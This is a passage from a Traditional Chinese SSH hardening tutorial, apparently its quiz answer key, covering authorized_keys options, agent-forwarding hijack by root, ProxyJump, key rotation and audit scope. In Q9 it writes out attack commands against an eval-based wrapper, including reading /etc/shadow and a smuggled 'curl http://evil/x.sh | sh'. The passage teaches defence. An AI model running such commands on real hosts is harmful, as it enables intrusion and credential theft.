> sshd 的處理是「**當作這個檔案不存在**」，直接跳到下一種認證方式。
> 從協定的角度，客戶端只知道「公鑰被拒絕了」，收不到任何理由 ——
> 這是刻意的設計（不對外洩漏伺服器端狀態）。
> ★★★ 所以「重貼公鑰三次」永遠不會有用，因為問題不在檔案內容。
> RHEL 系另要檢查 SELinux context（`restorecon -R -v ~/.ssh`）。
> 參見〈基礎操作 → 三、部署公鑰〉的 StrictModes 段落與〈排查步驟【3】〉。
>
> **Q4.** 三個問題，嚴重度遞增：
> 1. ★★ 型別是 `ssh-rsa` 但沒寫長度，若是 1024/2048-bit 就不合現行基準。
> 2. ★★★★ **註解是 `deployer@build01`** —— 這是 `ssh-keygen` 的預設值。
>    build01 改名或退役之後，沒人知道這把是誰的、哪一年放的、能不能刪，
>    稽核時只能列為「來源不明」。
> 3. ★★★★★ **選項欄是空的** —— 這是最嚴重的。
>
> 攻擊者拿到私鑰後可以：**從任何 IP 連入**、拿到**完整互動式 shell**、
> `deployer` 如果有 sudo 就能提權、用 `-R` 建立**反向隧道當長期後門**、
> 用 `-L` 把內網的資料庫轉出來、藉 agent forwarding 借用其他人的身分。
> 正解是加上 `restrict,from="…",command="…",expiry-time="…"`（見練習 1）。
> 參見〈進階應用 → 一、authorized_keys 的選項欄位〉。
>
> **Q5.** ★★★★★ **它會列出你 agent 裡所有金鑰的指紋** ——
> 也就是說，跳板機的 root **完全可以借用你的身分**。
> ```text
> 256 SHA256:cNgXnpcfTlWLmrBBnVB63+416+aHzJNnF/R1+K+gMlQ ops-wangxm-2026 (ED25519)
> ```
> 而且不只是「看得到」：他可以直接
> `SSH_AUTH_SOCK=... ssh root@核心資料庫` 登入任何接受這把公鑰的伺服器。
>
> 關鍵在於 **agent forwarding 轉發的是「簽章能力」，不是私鑰本身**。
> 攻擊者不需要偷走你的私鑰檔 —— 他只要在你還連著的這段時間內，
> 請你的 agent「幫我簽這個」就好。socket 的 `srw-------` 權限擋得住一般使用者，
> **擋不住 root，也擋不住任何有 sudo 的人**。
> 而且目標機的稽核日誌上留下的是**你的名字**。
> ★★★★★ 這就是機關跳板機必須禁用 `-A`、改用 `ProxyJump` 的原因。
> 參見〈進階應用 → 三、agent forwarding 的真實風險〉。
>
> **Q6.** **(B)**。
> `ProxyJump` 只是把跳板機當成一條 **TCP 通道**：你和目標機之間建立的是
> **端對端的 SSH 連線**，加密與認證都在兩端完成，跳板機看不到內容、
> **也沒有任何可以被借用的 socket 或身分留在上面**。
>
> 其他選項為什麼錯：
> (A) 速度沒有本質差異（都要經過跳板機）。
> (C) 錯 —— `ProxyJump` **仍然要在跳板機上有帳號並通過認證**。
> (D) 錯 —— 目標機看到的來源仍然是**跳板機的 IP**，
> 所以 `from=` 要寫跳板機而不是你的筆電。★★★★ 這一點很多人會設錯。
> 參見〈進階應用 → 三〉的 ForwardAgent／ProxyJump 對照表。
>
> **Q7.** 臨時解是加 **`-o IdentitiesOnly=yes`**：
> ```bash
> ssh -o IdentitiesOnly=yes -i ~/.ssh/id_ed25519_ops ops@10.10.20.31
> ```
> 只加 `-i` 不夠，是因為 ★★★★ **`-i` 的語意是「多加一把候選金鑰」，不是「只用這一把」**。
> 沒有 `IdentitiesOnly` 時，ssh 仍然會把 **agent 裡的所有金鑰**加上
> `~/.ssh` 底下所有預設檔名的金鑰一把一把送出去試，
> 而 sshd 的 `MaxAuthTries` 預設只有 **6** —— 第 7 次就直接斷線，
> 正確的那把可能排在第 9 位，**根本還沒輪到就被踢了**。
>
> 判斷方法：`ssh -v` 的輸出裡 `Offering public key:` 出現超過 5 次。
> 長久解是在 `~/.ssh/config` 逐站寫 `IdentityFile` + `IdentitiesOnly yes`
> （完整語法見 [[03-SSH-客戶端設定檔]]）。
> ★★★ 另外要注意這種試誤會累積伺服器端的失敗紀錄，可能觸發 fail2ban 把自己鎖掉。
> 參見〈進階應用 → 四、多把金鑰的試誤問題〉。
>
> **Q8.** 正確順序是**先加新 → 驗證 → 再退舊**：
> ```bash
> # 【1】加新（舊的還在，不影響任何人）
> sudo ssh-key-rotate add ops /tmp/ops-wangxm-2027.pub
>
> # 【2】★★★★ 另開一個【新終端】實測新金鑰
> ssh -o IdentitiesOnly=yes -o PasswordAuthentication=no \
>     -i ~/.ssh/id_ed25519_ops_2027 ops@web01 'id'
>
> # 【3】確認成功才退舊（註解掉，七天後才 purge）
> sudo ssh-key-rotate retire ops ops-wangxm-2026
> ```
> 「舊的先刪」錯在哪：★★★★★ 如果新公鑰貼壞了（最常見：編輯器把 base64 自動換行截斷）、
> 或權限鏈有問題、或註解欄與金鑰之間夾了 Tab，
> 你在**刪掉舊金鑰的那一刻就同時失去了唯一的進入方式**。
> 而 `authorized_keys` 的變更是**即時生效**的（不需要 reload sshd），
> 沒有任何緩衝時間。這時就只剩 IPMI／iDRAC／VM 主控台或跑一趟機房。
>
> ★★★★ 同樣的道理，`retire` 用「註解掉」而不是「刪掉」，
> 是為了保留七天的回溯視窗，發現漏改的自動化腳本時可以快速還原。
> 參見〈完整實戰範例 → 步驟【6】〉。
>
> **Q9.** ★★★★★ 因為 `eval "$SSH_ORIGINAL_COMMAND"` 會把客戶端送來的**任意字串當成 shell 指令執行**，
> 這等於把 `command=` 的限制整個作廢。
>
> 攻擊者拿到這把私鑰後只要：
> ```bash
> ssh -i deploy_ci deployer@host 'bash -i'
> ssh -i deploy_ci deployer@host 'cat /etc/shadow'
> ssh -i deploy_ci deployer@host 'deploy v1; curl http://evil/x.sh | sh'
> ```
> 就拿到了跟沒有 `command=` 一模一樣的能力。
> `command=` 的保護只在於「**強制執行你指定的那支程式**」，
> 至於那支程式自己要不要把控制權交還給攻擊者，是腳本作者的責任。
>
> 正解是用**白名單比對**（`case` 逐一列舉允許的指令樣式），
> 並且用 `exec` 直接呼叫目標程式而不經過 shell 展開；
> 參數也要用字元類別限制（例如只允許 `[a-zA-Z0-9._-]`）。
> rsync 場景直接用現成的 `rrsync -ro <目錄>`，不要自己寫。
> 參見〈進階應用 → 一〉的 `deploy-wrapper` 範例。
>
> **Q10.** ★★★★ 因為**服務帳號的家目錄常常不在 `/home`**。
> 稽核腳本應該從 `/etc/passwd` 的第 6 欄取得**所有**帳號的家目錄再逐一掃描。
>
> 實際會漏掉的位置（舉兩個以上）：
> 1. **`/var/www`** —— `www-data` 的家目錄。開發除錯時常有人往這裡塞公鑰。
> 2. **`/srv/gitlab-runner`、`/home/gitlab-runner` 以外的 runner 目錄** —— CI 執行器。
> 3. **`/opt/<應用>`** —— 廠商安裝的應用程式帳號（監控代理、備份代理）。
> 4. **`/var/lib/postgresql`、`/var/lib/mysql`** —— 資料庫帳號，複寫或備份可能用到 SSH。
> 5. **`sshd_config` 自訂的集中式 `AuthorizedKeysFile`**（例如 `/etc/ssh/authorized_keys/%u`）
>    —— 完全不在任何家目錄底下。
>
> ★★★★ 這正是離職清除最常出包的地方：`ops` 帳號清乾淨了，
> 但離職同仁當初「為了除錯先加一下」放進 `www-data` 或 `deployer` 的公鑰還在，
> 而那些帳號往往還能寫入網站根目錄。
> 參見〈完整實戰範例 → 步驟【5】〉的 `collect_files()` 與〈步驟【8】〉checklist 第 4 項。

---

## 延伸閱讀

- [[01-SSH-原理與第一次連線]] — 主機金鑰、`known_hosts` 與中間人攻擊；本篇的 `Server accepts key` 之前發生的事都在那篇
- [[03-SSH-客戶端設定檔]] — `~/.ssh/config` 的 `Host`／`Match` 完整語法、`IdentitiesOnly`／`ProxyJump`／`AddKeysToAgent` 的正式寫法
- [[04-sshd-伺服器端設定]] — `PubkeyAuthentication`、`AuthorizedKeysFile`、`StrictModes`、`MaxAuthTries`、`AllowAgentForwarding` 的完整解讀，以及**安全地關閉密碼登入**的順序
- [[07-SSH-安全強化]] — FIDO2 硬體金鑰逐步操作、SSH CA 短效憑證、fail2ban 與存取控制
- [[05-SSH-隧道與埠轉發]] — `permitopen=`／`permitlisten=` 要限制的那些功能實際能做什麼
- [[06-SFTP-與受限使用者]] — 只給檔案傳輸不給 shell 的另一種做法（`ForceCommand internal-sftp` + `ChrootDirectory`）
- [[08-Git-伺服器端與自動部署]] — Deploy Key 的實務、用 `pre-receive` 攔截誤推的私鑰
- [[07-身分存取管理IAM與MFA]] — 把 SSH 金鑰納入整體身分治理，以及 MFA 與短效憑證的整合
- [[09-資安稽核與符合性檢核]] — 金鑰清冊要保留多久、稽核報表怎麼呈現
- OpenSSH `sshd(8)` AUTHORIZED_KEYS FILE FORMAT：<https://man.openbsd.org/sshd.8#AUTHORIZED_KEYS_FILE_FORMAT>
- OpenSSH `ssh-keygen(1)`：<https://man.openbsd.org/ssh-keygen.1>
- OpenSSH `ssh-agent(1)`：<https://man.openbsd.org/ssh-agent.1>
- OpenSSH 版本沿革（DSA 移除、FIDO2 支援的版本對應）：<https://www.openssh.com/releasenotes.html>
